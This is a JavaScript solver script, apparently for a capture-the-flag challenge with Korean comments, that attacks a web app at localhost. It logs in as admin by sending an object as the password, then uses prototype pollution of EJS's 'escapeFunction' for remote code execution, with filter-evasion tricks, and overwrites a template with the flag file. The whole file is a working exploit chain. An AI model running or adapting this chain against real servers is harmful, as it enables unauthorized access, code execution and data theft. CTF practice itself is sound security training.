const targetUrl = 'http://localhost:3000'; // 실제 서버 주소로 수정

async function solve() {
    console.log("==================================================");
    console.log("[*] Phase 1: Admin Login Bypass (SQLi)");
    console.log("==================================================");

    // password에 객체를 넣어 password = password = 1 쿼리를 유도
    const loginRes = await fetch(`${targetUrl}/auth/login`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            username: "admin",
            password: { password: 1 }
        })
    });

    if (!loginRes.ok) {
        const err = await loginRes.text();
        console.error(`[-] Login failed! Status: ${loginRes.status}, Body: ${err}`);
        console.error("[-] 서버가 이미 오염되었을 수 있습니다. VM을 재시작하세요.");
        return;
    }

    const { token } = await loginRes.json();
    console.log(`[+] Success! Admin Token: ${token}\n`);

    console.log("==================================================");
    console.log("[*] Phase 2: Prototype Pollution (Filter Bypass)");
    console.log("==================================================");

    /**
     * 필터링 우회 전략:
     * 1. 공백(' ') 미사용: 모든 함수 호출을 붙여서 작성.
     * 2. 'fs', 'flag' 미사용: 'f'.concat('s') 방식 사용.
     * 3. 'cache': false 설정: EJS가 캐시된 템플릿을 쓰지 않고 매번 새로 컴파일하게 함.
     * 4. escapeFunction: EJS 컴파일 시점에 RCE 실행.
     */
    const ppPayload = {
        "constructor": {
            "prototype": {
                "client": true,
                "cache": false, 
                "escapeFunction": "1;import('f'.concat('s')).then(m=>m.writeFileSync('views/index.ejs',m.readFileSync('f'.concat('l','a','g'))))//"
            }
        }
    };

    const ppRes = await fetch(`${targetUrl}/admin`, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${token}`
        },
        body: JSON.stringify(ppPayload)
    });

    console.log(`[+] PP Status: ${ppRes.status} (200이면 필터 통과)`);

    console.log("\n==================================================");
    console.log("[*] Phase 3: Triggering RCE & Fetching Flag");
    console.log("==================================================");

    // 첫 번째 요청: EJS 컴파일을 유도하여 escapeFunction(RCE) 실행
    console.log("[+] Step 1: Triggering file overwrite...");
    await fetch(`${targetUrl}/`);

    // async import()와 writeFileSync가 완료될 때까지 대기
    console.log("[*] Waiting 2 seconds for the server to write the flag...");
    await new Promise(resolve => setTimeout(resolve, 2000));

    // 두 번째 요청: 이제 flag 내용으로 덮어씌워진 index.ejs를 읽음
    console.log("[+] Step 2: Fetching the overwritten index.ejs...");
    const flagRes = await fetch(`${targetUrl}/`);
    const result = await flagRes.text();

    console.log("\n🚩 [ RESULT ] 🚩\n");
    console.log(result);
    console.log("\n🚩🚩🚩🚩🚩🚩🚩🚩🚩🚩\n");
}

solve().catch(console.error);